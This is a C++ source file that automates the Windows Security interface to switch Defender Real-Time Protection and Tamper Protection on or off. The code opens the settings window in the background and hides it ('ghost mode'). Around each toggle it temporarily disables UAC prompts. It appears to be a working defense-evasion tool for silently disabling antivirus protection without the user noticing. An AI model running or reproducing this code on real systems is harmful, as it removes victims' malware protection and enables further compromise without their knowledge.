// DefenderUI.cpp
// UI Automation implementation for Windows Defender Real-Time Protection and Tamper Protection

#include "DefenderUI.h"
#include "DefenderStealth.h"
#include <shellapi.h>
#include <thread>
#include <chrono>
#include <iostream>

using namespace std::chrono_literals;

// Simple logging macros - cannot use common.h due to UIAutomation conflicts
#define INFO_LOG(msg) std::wcout << L"[*] " << msg << L"\n"
#define ERROR_LOG(msg) std::wcout << L"[-] " << msg << L"\n"
#define DEBUG_LOG(msg) // Disabled by default

WindowsDefenderAutomation::WindowsDefenderAutomation() {
    CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    CoCreateInstance(CLSID_CUIAutomation, nullptr, CLSCTX_INPROC_SERVER, IID_IUIAutomation, (void**)&pAutomation);
    
    // Recover UAC if previous run crashed
    DefenderStealth::RecoverUACIfNeeded();
}

WindowsDefenderAutomation::~WindowsDefenderAutomation() {
    if (pRootElement) pRootElement->Release();
    if (pAutomation) pAutomation->Release();
    CoUninitialize();
}

// Cold boot detection: checks if this is first run after login
bool WindowsDefenderAutomation::isColdBoot() {
    return !DefenderStealth::CheckVolatileWarmMarker();
}

// Pre-warm Defender on cold boot to stabilize UI Automation
bool WindowsDefenderAutomation::preWarmDefender() {
    INFO_LOG(L"Cold boot detected - pre-warming Windows Defender");
    
    // Open Defender without automation (just to load components)
    ShellExecuteW(nullptr, L"open", L"windowsdefender://threatsettings", 
                  nullptr, nullptr, SW_SHOWNOACTIVATE);
    
    // Wait for window to appear (longer timeout for cold boot)
    std::this_thread::sleep_for(800ms);
    
    HWND hwnd = DefenderStealth::FindSecurityWindowOnly(10);
    
    if (hwnd) {
        DEBUG_LOG(L"Pre-warm window found, waiting for full initialization");
        
        // Wait for window to be fully initialized
        std::this_thread::sleep_for(800ms);
        
        // Bring to foreground (critical for cold boot)
        SetForegroundWindow(hwnd);
        std::this_thread::sleep_for(100ms);
        
        // Close pre-warm window
        DEBUG_LOG(L"Closing pre-warm window");
        SendMessage(hwnd, WM_SYSCOMMAND, SC_CLOSE, 0);
        
        // Verify window closed
        bool closed = false;
        for (int i = 0; i < 30; i++) {
            if (!IsWindow(hwnd) || !IsWindowVisible(hwnd)) {
                closed = true;
                break;
            }
            std::this_thread::sleep_for(100ms);
        }
        
		if (!closed) {
			DEBUG_LOG(L"Retry close with PostMessage");
			PostMessage(hwnd, WM_CLOSE, 0, 0);

			for (int i = 0; i < 10; i++) {
				if (!IsWindow(hwnd) || !IsWindowVisible(hwnd)) {
					break;
				}
				std::this_thread::sleep_for(100ms);
			}
		}
        
        // Mark as warmed for this session
        DefenderStealth::SetVolatileWarmMarker();
        DEBUG_LOG(L"Pre-warm complete");
        return true;
    }
    
    DEBUG_LOG(L"Pre-warm window not found, continuing anyway");
    return false;
}

bool WindowsDefenderAutomation::openDefenderSettings() {
    DEBUG_LOG(L"Opening Windows Defender");
    
    // Check if cold boot and pre-warm if needed
    if (isColdBoot()) {
        preWarmDefender();
        std::this_thread::sleep_for(800ms);
    }
    
    // Open window in background to avoid user interference
    ShellExecuteW(nullptr, L"open", L"windowsdefender://threatsettings", nullptr, nullptr, SW_SHOWMINNOACTIVE);
    
    // Find and cloak window (ghost mode)
    hwndSecurity = DefenderStealth::FindAndCloakSecurityWindow(10);

    // Wait for UI to load (50 retries * 100ms = 5 sec for slow systems)
    if (!hwndSecurity || !waitForUILoaded(50)) {
        ERROR_LOG(L"Failed to load Defender UI (timeout on slow system)");
        return false;
    }
    return true;
}

bool WindowsDefenderAutomation::waitForUILoaded(int maxRetries) {
    for (int i = 0; i < maxRetries; ++i) {
        try {
            if (pRootElement) pRootElement->Release();
            HRESULT hr = pAutomation->ElementFromHandle(hwndSecurity, &pRootElement);
            
            if (SUCCEEDED(hr)) {
                // Check if element tree is populated (more than 10 elements = loaded)
                if (countTotalElements() > 10) return true;
            }
        }
        catch (...) {}
        std::this_thread::sleep_for(100ms);
    }
    return false;
}

// Find first toggle switch (Real-Time Protection)
IUIAutomationElement* WindowsDefenderAutomation::findFirstToggleSwitch() {
    IUIAutomationCondition* pCondition = nullptr;
    VARIANT var;
    var.vt = VT_I4;
    var.lVal = UIA_ButtonControlTypeId;
    pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, var, &pCondition);

    IUIAutomationElementArray* pButtons = nullptr;
    if (!pRootElement) return nullptr;
    
    HRESULT hr = pRootElement->FindAll(TreeScope_Descendants, pCondition, &pButtons);
    pCondition->Release();

    if (FAILED(hr) || !pButtons) return nullptr;

    int count = 0;
    pButtons->get_Length(&count);

    for (int i = 0; i < count; ++i) {
        IUIAutomationElement* pButton = nullptr;
        pButtons->GetElement(i, &pButton);
        
        IUIAutomationTogglePattern* pToggle = nullptr;
        hr = pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

        if (SUCCEEDED(hr) && pToggle != nullptr) {
            pToggle->Release();
            pButtons->Release();
            return pButton;
        }
        pButton->Release();
    }
    pButtons->Release();
    return nullptr;
}

// Find last toggle switch (Tamper Protection)
IUIAutomationElement* WindowsDefenderAutomation::findLastToggleSwitch() {
    IUIAutomationCondition* pCondition = nullptr;
    VARIANT var;
    var.vt = VT_I4;
    var.lVal = UIA_ButtonControlTypeId;
    pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, var, &pCondition);

    IUIAutomationElementArray* pButtons = nullptr;
    if (!pRootElement) return nullptr;

    HRESULT hr = pRootElement->FindAll(TreeScope_Descendants, pCondition, &pButtons);
    pCondition->Release();

    if (FAILED(hr) || !pButtons) return nullptr;

    int count = 0;
    pButtons->get_Length(&count);
    IUIAutomationElement* pLastToggle = nullptr;

    for (int i = 0; i < count; ++i) {
        IUIAutomationElement* pButton = nullptr;
        pButtons->GetElement(i, &pButton);
        
        IUIAutomationTogglePattern* pToggle = nullptr;
        hr = pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

        if (SUCCEEDED(hr) && pToggle != nullptr) {
            pToggle->Release();
            if (pLastToggle) pLastToggle->Release();
            pLastToggle = pButton;
        } else {
            pButton->Release();
        }
    }
    pButtons->Release();
    return pLastToggle;
}

int WindowsDefenderAutomation::countTotalElements() {
    if (!pRootElement) return 0;
    IUIAutomationCondition* pCondition = nullptr;
    pAutomation->CreateTrueCondition(&pCondition);
    
    IUIAutomationElementArray* pElements = nullptr;
    pRootElement->FindAll(TreeScope_Descendants, pCondition, &pElements);
    pCondition->Release();

    int count = 0;
    if (pElements) {
        pElements->get_Length(&count);
        pElements->Release();
    }
    return count;
}

// Wait for UI structure change (structural density detection)
bool WindowsDefenderAutomation::waitForStructureChange(int baselineCount, bool expectIncrease, int timeoutSeconds) {
    DEBUG_LOG(L"Waiting for UI update");
    int maxLoops = timeoutSeconds * 10;
    
    for (int i = 0; i < maxLoops; ++i) {
        int currentCount = countTotalElements();
        bool structureChanged = expectIncrease ? (currentCount > baselineCount) : (currentCount < baselineCount);

        if (structureChanged) {
            std::this_thread::sleep_for(200ms);
            int recheckCount = countTotalElements();
            bool stable = expectIncrease ? (recheckCount > baselineCount) : (recheckCount < baselineCount);
            
            if (stable) {
                DEBUG_LOG(L"UI update confirmed");
                return true;
            }
        }
        std::this_thread::sleep_for(100ms);
    }
    DEBUG_LOG(L"UI update timeout");
    return false;
}

void WindowsDefenderAutomation::closeSecurityWindow() {
    if (hwndSecurity) SendMessage(hwndSecurity, WM_CLOSE, 0, 0);
}

// Real-Time Protection operations
bool WindowsDefenderAutomation::toggleRealTimeProtection() {
    if (!DefenderStealth::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findFirstToggleSwitch();
    if (!pButton) { DefenderStealth::RestoreUAC(); return false; }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = false;
    if (pToggle) {
        ToggleState stateBefore;
        pToggle->get_CurrentToggleState(&stateBefore);
        int baseline = countTotalElements();

        pToggle->Toggle();
        pToggle->Release();
        pButton->Release();

        result = waitForStructureChange(baseline, (stateBefore == ToggleState_On));
    } else {
        pButton->Release();
    }
    
    DefenderStealth::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::enableRealTimeProtection() {
    if (!DefenderStealth::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findFirstToggleSwitch();
    if (!pButton) { 
        DefenderStealth::RestoreUAC(); 
        return false; 
    }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = true;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        
        if (state == ToggleState_Off) {
            int baseline = countTotalElements();
            pToggle->Toggle();
            pToggle->Release();
            pButton->Release();
            result = waitForStructureChange(baseline, false);
        } else {
            INFO_LOG(L"RTP already enabled");
            pToggle->Release();
            pButton->Release();
        }
    } else {
        pButton->Release();
        result = false;
    }
    
    DefenderStealth::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::disableRealTimeProtection() {
    if (!DefenderStealth::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findFirstToggleSwitch();
    if (!pButton) { DefenderStealth::RestoreUAC(); return false; }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = true;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        
        if (state == ToggleState_On) {
            int baseline = countTotalElements();
            pToggle->Toggle();
            pToggle->Release();
            pButton->Release();
            result = waitForStructureChange(baseline, true);
        } else {
            INFO_LOG(L"RTP already disabled");
            pToggle->Release();
            pButton->Release();
        }
    } else {
        pButton->Release();
        result = false;
    }
    
    DefenderStealth::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::getRealTimeProtectionStatus() {
    IUIAutomationElement* pButton = findFirstToggleSwitch();
    if (!pButton) return false;

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool isEnabled = false;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        isEnabled = (state == ToggleState_On);
        std::wcout << L"[*] RTP Status: " << (isEnabled ? L"ENABLED" : L"DISABLED") << L"\n";
        pToggle->Release();
    }
    pButton->Release();
    return isEnabled;
}

// Tamper Protection operations
bool WindowsDefenderAutomation::toggleTamperProtection() {
    if (!DefenderStealth::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findLastToggleSwitch();
    if (!pButton) { DefenderStealth::RestoreUAC(); return false; }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = false;
    if (pToggle) {
        ToggleState stateBefore;
        pToggle->get_CurrentToggleState(&stateBefore);
        int baseline = countTotalElements();

        pToggle->Toggle();
        pToggle->Release();
        pButton->Release();

        result = waitForStructureChange(baseline, (stateBefore == ToggleState_On));
    } else {
        pButton->Release();
    }
    
    DefenderStealth::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::enableTamperProtection() {
    if (!DefenderStealth::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findLastToggleSwitch();
    if (!pButton) { 
        DefenderStealth::RestoreUAC(); 
        return false; 
    }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = true;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        
        if (state == ToggleState_Off) {
            int baseline = countTotalElements();
            pToggle->Toggle();
            pToggle->Release();
            pButton->Release();
            result = waitForStructureChange(baseline, false);
        } else {
            INFO_LOG(L"Tamper Protection already enabled");
            pToggle->Release();
            pButton->Release();
        }
    } else {
        pButton->Release();
        result = false;
    }
    
    DefenderStealth::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::disableTamperProtection() {
    if (!DefenderStealth::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findLastToggleSwitch();
    if (!pButton) { DefenderStealth::RestoreUAC(); return false; }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = true;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        
        if (state == ToggleState_On) {
            int baseline = countTotalElements();
            pToggle->Toggle();
            pToggle->Release();
            pButton->Release();
            result = waitForStructureChange(baseline, true);
        } else {
            INFO_LOG(L"Tamper Protection already disabled");
            pToggle->Release();
            pButton->Release();
        }
    } else {
        pButton->Release();
        result = false;
    }
    
    DefenderStealth::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::getTamperProtectionStatus() {
    IUIAutomationElement* pButton = findLastToggleSwitch();
    if (!pButton) return false;

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool isEnabled = false;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        isEnabled = (state == ToggleState_On);
        std::wcout << L"[*] Tamper Protection Status: " << (isEnabled ? L"ENABLED" : L"DISABLED") << L"\n";
        pToggle->Release();
    }
    pButton->Release();
    return isEnabled;
}
